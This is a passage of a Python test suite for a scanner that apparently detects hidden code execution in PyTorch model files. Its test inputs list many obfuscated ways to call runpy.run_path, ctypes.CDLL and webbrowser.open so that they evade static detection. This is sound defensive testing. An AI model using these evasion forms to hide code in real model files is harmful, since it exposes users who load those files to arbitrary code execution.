            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"        # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + clause_source
            + padding
            + b"        import runpy as rp\n"
            + b"        return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_multiple_shadowed_aliases_before_late_safe_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + b"c = runpy._run_module_as_main\n"
            + padding
            + b"a = len\n"
            + b"b = len\n"
            + b"c = len\n"
            + b"a([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_live_alias_call_on_shadow_line(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + b"a = len; b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_keeps_scanning_after_same_line_safe_shadow_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + b"a = len; a([])\n"
            + padding
            + b"b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_safe_same_line_shadow_calls_do_not_exhaust_priority_budget(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        safe_shadow_calls = b"".join(b"a = len; a([])\n" + padding for _index in range(_PRIORITY_USAGE_STRESS_LINES))
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + safe_shadow_calls
            + b"b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_indented_safe_same_line_shadow_calls_do_not_exhaust_priority_budget(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        safe_shadow_calls = b"".join(
            b"    a = len; a([])\n" + padding for _index in range(_PRIORITY_USAGE_STRESS_LINES)
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + b"    import runpy\n"
            + b"    a = runpy.run_path\n"
            + b"    b = runpy.run_module\n"
            + padding
            + safe_shadow_calls
            + b"    return b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_same_line_call_before_shadow(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + padding
            + b"a('payload.py'); a = len\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_same_line_alias_capture_before_shadow(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as a\n"
            + padding
            + b"b = a.run_path; a = len\n"
            + padding
            + b"b('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_unrelated_assignment_alias_before_delayed_priority_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\nx = 1\n"
            + padding
            + b"x()\n"
            + padding
            + b"rp.run_path('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_function_local_assignment_alias_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import runpy\n"
            b"    run = runpy.run_path\n" + padding + b"    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "call_line",
        [
            b"getattr(rp, 'run_path')('payload.py')\n",
            b"getattr(\n    rp, 'run_' + 'path'\n)('payload.py')\n",
        ],
    )
    def test_scan_model_detects_late_getattr_priority_alias_call(self, call_line: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + call_line + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("import_line", "call_line"),
        [
            (b"from runpy import run_path as runner\n", b"(runner)('payload.py')\n"),
            (b"from runpy import run_path as runner\n", b"(\n runner\n)('payload.py')\n"),
            (b"from runpy import run_path as runner\n", b"(\n runner\n) \\\n('payload.py')\n"),
            (b"from runpy import run_path as runner\n", b"runner \\\n('payload.py')\n"),
            (b"import runpy as rp\n", b"((rp).run_path)('payload.py')\n"),
            (b"import runpy as rp\n", b"(\n rp.run_path\n)('payload.py')\n"),
            (b"import runpy as rp\n", b"(\n rp.run_path\n) \\\n('payload.py')\n"),
            (b"import runpy as rp\n", b"rp.run_path \\\n('payload.py')\n"),
            (b"import runpy as rp\n", b"rp \\\n    .run_path('payload.py')\n"),
        ],
    )
    def test_scan_model_detects_late_parenthesized_priority_alias_call(
        self, import_line: bytes, call_line: bytes
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + import_line + padding + call_line + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("late_bindings", "call_line"),
        [
            (b"runner = rp.run_path\n", b"runner('payload.py')\n"),
            (b"runner = rp.run_path\n", b"(runner)('payload.py')\n"),
            (b"runner = rp.run_path\n", b"(\n runner\n)('payload.py')\n"),
            (b"runner = rp.run_path\n", b"runner \\\n('payload.py')\n"),
            (b"first = rp.run_path\nrunner = first\n", b"(runner)('payload.py')\n"),
            (b"enabled = True\nrunner = rp.run_path if enabled else print\n", b"(runner)('payload.py')\n"),
            (b"runner = rp.run_path or print\n", b"(runner)('payload.py')\n"),
            (b"runner = False or rp.run_path\n", b"(runner)('payload.py')\n"),
            (
                b"enabled = True\nrunner = (\n    rp.run_path\n    if enabled\n    else print\n)\n",
                b"(runner)('payload.py')\n",
            ),
            (b"mod = rp\n", b"getattr(mod, 'run_path')('payload.py')\n"),
            (b"\x00\xffmod = rp\n", b"getattr(mod, 'run_path')('payload.py')\n"),
        ],
    )
    def test_scan_model_detects_late_derived_priority_alias_call(self, late_bindings: bytes, call_line: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + late_bindings + call_line + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_long_late_derived_alias_chain_with_bounded_replay(self) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        bindings = b"value_0 = rp.run_path\n" + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 40_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_39999)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("priority_import", "call_line", "expected_pattern"),
        [
            (b"import runpy as rp\n", b"rp.run_path.__call__('payload.py')\n", "Dynamic module execution detected"),
            (
                b"import webbrowser as wb\n",
                b"wb.open.__call__('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (b"import ctypes as c\n", b"c.CDLL.__call__('payload.so')\n", "Native library loading detected"),
            (
                b"import runpy as rp\n",
                b"(rp.run_path).__call__('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"(wb.open).__call__('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (b"import ctypes as c\n", b"(c.CDLL).__call__('payload.so')\n", "Native library loading detected"),
            (
                b"import runpy as rp\n",
                b"(\n rp.run_path\n).__call__('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"(\n wb.open\n).__call__('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"(\n c.CDLL\n).__call__('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import runpy as rp\n",
                b"rp.run_path.__call__(\n    'payload.py'\n)\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\n",
                b"(\n    rp.run_path\n) \\\n.__call__('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\n",
                b"rp.run_path.\\\n__call__('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\n",
                b"(\n    rp.run_path  # callable\n    .__call__('payload.py')\n)\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\n",
                b"(\n    rp.run_path.__call__  # invoke\n    ('payload.py')\n)\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\n",
                b"(\n    (rp.run_path)  # callable\n    .__call__('payload.py')\n)\n",
                "Dynamic module execution detected",
            ),
            (
                b"from runpy import run_path as runner\n",
                b"runner.__call__.__call__(\n    'payload.py'\n)\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\n",
                b"getattr(rp.run_path, '__call__')('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\n",
                b"getattr(\n    rp.run_path,\n    '__call__'\n)(\n    'payload.py'\n)\n",
                "Dynamic module execution detected",
            ),
            (
                b"import ctypes as c\n",
                b"getattr(c, 'CDLL').__call__('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"vars(c)['CDLL'].__call__('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"object.__getattribute__(c, 'CDLL')('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"type(c).__getattribute__(c, 'CDLL')('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"vars(c).get('CDLL')('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"dict.get(vars(c), 'CDLL')('payload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_detects_long_explicit_dunder_call_with_bounded_replay(
        self, priority_import: bytes, call_line: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + priority_import + padding + call_line + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "code_execution_pattern" and f.pattern == expected_pattern for f in findings)

    def test_scan_model_ignores_long_passive_reference_chain_with_bounded_replay(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        bindings = b"value_0 = print(rp.run_path)\n" + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 40_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_39999)('safe')\n" + padding

        original_extraction_windows = jit_script_module._embedded_python_extraction_windows

        def assert_unique_extraction_windows(data: bytes) -> list[tuple[bytes, bool]]:
            windows = original_extraction_windows(data)
            assert len(windows) == len(set(windows))
            return windows

        def reject_heavy_replay(*_args: object, **_kwargs: object) -> bool:
            raise AssertionError("proven passive forwarding must not enter heavyweight replay")

        monkeypatch.setattr(jit_script_module, "_embedded_python_extraction_windows", assert_unique_extraction_windows)
        monkeypatch.setattr(jit_script_module, "_late_assignment_binds_builtins_mapping", reject_heavy_replay)

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )
        incomplete_reasons = {
            finding.details.get("reason") for finding in findings if finding.type == "analysis_incomplete"
        }
        assert {
            jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON,
            jit_script_module._EMBEDDED_PYTHON_SNIPPET_LIMIT_REASON,
        } <= incomplete_reasons

    @pytest.mark.parametrize(
        "binding",
        [
            b"print = rp.run_path\nvalue_0 = print(rp.run_path)\n",
            b"value_0 = print(rp.run_path('payload.py'))\n",
        ],
    )
    def test_scan_model_does_not_treat_executing_print_shapes_as_passive(self, binding: bytes) -> None:
        detector = JITScriptDetector()
        forwards = b"".join(f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 64))
        source = b"\x00\xffimport runpy as rp\n" + binding + forwards + b"value_63('safe')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_detects_forwarded_conditional_alias_beyond_replay_budget(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"enabled = True\nvalue_0 = rp.run_path if enabled else print\n" + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_1999)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_conditional_expression_alias_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\n" + padding + b"(rp.run_path if True else print)('payload.py')\n" + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_late_statically_safe_conditional_expression_alias_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + b"(rp.run_path if False else print)('safe')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_member_load_invoked_by_local_target(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + b"for f in [rp.run_path]: f('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_compound_alias_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"try:\n    pass\nfinally:\n    rp.run_path('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_same_line_assignment_alias_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + b"x = 0; rp.run_path('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_vars_alias_lookup_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport ctypes as c\n" + padding + b"vars(c)['CDLL']('payload')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    def test_scan_model_ignores_long_chain_after_safe_module_rebind(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"rp = object()\nvalue_0 = rp.run_path\n" + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_1999)('safe')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "line_suffix",
        [
            b"",
            b"  # inert",
            b";",
            b"; pass",
            b"; None",
            b"; ...",
            b"; ()",
            b"; []",
            b"; {}",
            b"; not None",
            b"; b''",
            b"; r''",
            b"; 1j",
            b"; 1e3",
            b"; 1_000",
            b"; 0x10",
            b"; 0b1",
            b"; b''; [1]",
            b"  # ; b''",
            b"  # ; 0x10",
            b"  # ; []",
        ],
    )
    def test_scan_model_detects_long_parenthesized_forwarding_chain_with_bounded_replay(
        self, line_suffix: bytes
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"value_0 = rp.run_path\n" + b"".join(
            f"value_{index} = (value_{index - 1})".encode() + line_suffix + b"\n" for index in range(1, 40_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_39999)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_long_varying_literal_forwarding_suffixes_with_bounded_replay(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"value_0 = rp.run_path\n" + b"".join(
            f"value_{index} = (value_{index - 1}); [{index}]\n".encode() for index in range(1, 10_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_9999)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_deep_nested_inert_forwarding_suffix_without_recursion(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        nested_literal = b"[" * 1_200 + b"0" + b"]" * 1_200
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"runner = rp.run_path; "
            + nested_literal
            + b"\n(runner)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_parenthesized_priority_alias_across_retained_boundary(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        import_line = b"from runpy import run_path as runner\n"
        boundary_padding_length = (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES - len(import_line) - len(b"(\n")
        )
        boundary_padding = b"#" + b"x" * (boundary_padding_length - 2) + b"\n"
        trailing_padding = b"# pad\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + import_line
            + boundary_padding
            + b"(\n runner\n)('payload.py')\n"
            + trailing_padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert (
            len(import_line + boundary_padding + b"(\n")
            == jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES
        )
        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_late_parenthesized_priority_alias_argument(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + b"print((rp))\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize("call", [b"(\n runner\n)('safe')\n", b"runner \\\n('safe')\n"])
    def test_scan_model_preserves_visible_safe_rebind_before_late_continued_alias_call(self, call: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + padding
            + b"runner = print\n"
            + call
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_visible_safe_module_rebind_before_late_parenthesized_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b"rp = object()\n"
            + b"((rp).run_path)('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize("safe_rebind", [b"runner = (\n    print\n)\n", b"runner = \\\n    print\n"])
    def test_scan_model_preserves_multiline_safe_rebind_before_late_parenthesized_call(
        self, safe_rebind: bytes
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
